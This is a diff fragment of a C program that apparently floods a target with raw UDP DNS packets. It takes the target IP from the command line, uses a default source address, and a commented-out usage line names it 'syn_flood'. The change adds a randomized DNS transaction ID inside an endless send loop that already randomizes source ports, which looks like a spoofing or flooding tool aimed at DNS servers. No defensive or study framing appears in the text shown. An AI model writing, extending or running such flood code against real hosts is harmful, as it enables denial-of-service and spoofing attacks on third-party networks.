@@ -100,7 +100,7 @@ int main(int argc, char *argv[]) {
     char *src_ip_str = DEFAULT_SRC_IP;
     char *dst_ip_str = argv[1];
     
-    printf("set ips\n");
+    // printf("set ips\n");
 
     // if (argc > 1) {
     //     strcpy(dst_ip_str, argv[0]);
@@ -108,7 +108,7 @@ int main(int argc, char *argv[]) {
     //     printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
     //     exit(1);
     // }
-    printf("set auth ips\n");
+    // printf("set auth ips\n");
 
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (sock < 0) {
@@ -184,6 +184,7 @@ int main(int argc, char *argv[]) {
     //free(pseudogram);
 
     while (1) {
+	dnsh->tid = htons(rand() % 0xffff);
         udph->source = htons(random_port());
         udp_len = sizeof(struct udphdr) + sizeof(struct dns_header) + query_len;
         udph->len = htons(udp_len);
